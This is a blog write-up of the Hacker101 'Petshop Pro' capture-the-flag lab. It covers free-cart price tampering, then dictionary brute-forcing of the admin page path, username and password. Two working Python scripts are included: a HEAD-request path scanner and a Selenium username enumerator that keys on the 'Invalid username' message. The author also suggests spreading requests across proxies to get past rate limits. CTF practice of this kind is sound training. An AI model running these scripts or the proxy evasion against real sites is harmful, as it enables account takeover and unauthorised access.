# Petshop Pro - Capture The Flag from Hacker101
Created at <time datetime="2021-05-30T00:00:00">2021-5-30</time>

[TOC]

At the start you are given simple website with cats and dogs which you can simply add to your cart. After adding few cats and dogs you can proceed to checkout and after submitting the orders you got server is unavailable.

## 1. The First Flag

Isn't beautiful to buy something for free. Well, thats what is the first flag about.

The first flag hints are: 

* Can you buy the cart for free?
* Keep in mind that every input should be tested.

## 2. The Second flag

The Second flag was kinda hard for me as I couldn't come up with idea where should I search for the flag. Though the advice didn't make it easier either!

The second flag hints are:

* Search for admin panel page
* Tools will help you to find corrrect user name 
* Tools will help you to find corrrect password

### 2.1. Admin Page

The advice about admin panel page was not so helpful at the first look. Mainly because brute force approach to find the admin page did not work. I took [a-z] permutations of alphabet but there were too many to try. It was not feasible solution in both time fashion and number of maximum queries before connection dropped. So I decided to use few dictionaries of common admin page names and it worked after few tries. Just use the right dictionary and that's it :) The solution could be improved by load balancing requests between more proxies so more queries will be processed than from single source. 

Here is a simple python snippet which could be used.
```python
import requests
import string

session = requests.Session()

content = open('admin_page_list.txt', 'r')

for line in content:
  x = session.head('http://xxx.xxx.xxx.xxx/' + line.strip())
  if x.status_code == 200:
    print('Web site exists: ' + x.url)
    break
  else:
    print('Not found' + x.url)
 
```

### 2.2. User Name

I used the same approach with dictionary to search for user name. The only change was that I chose selenium to render the page, to fill in user name and to check whether it is correct user after submition. 

```python
from selenium import webdriver
from selenium.webdriver.common.keys import Keys
import time

driver = webdriver.Firefox()
driver.get("http://xxx.xxx.xxx.xxx/login")

# Opening file
file1 = open('user_list.txt', 'r')
 
for line in file1:
    user_name = line.strip()
    user = driver.find_elements_by_css_selector('body > form > p:nth-child(1) > input[type=text]')[0]
    user.send_keys(user_name)

    loginbtn = driver.find_elements_by_xpath('/html/body/form/p[3]/input')[0]
    loginbtn.send_keys(Keys.RETURN)

    driver.implicitly_wait(15)

    resp = driver.find_elements_by_css_selector('body > p:nth-child(2) > b:nth-child(1)')[0]
    if resp.text != 'Invalid username':
        print(user_name)
        break

    time.sleep(1)
 
# Closing files
file1.close()
driver.close()
```

### 2.3. Users Password

Just the same as with user name.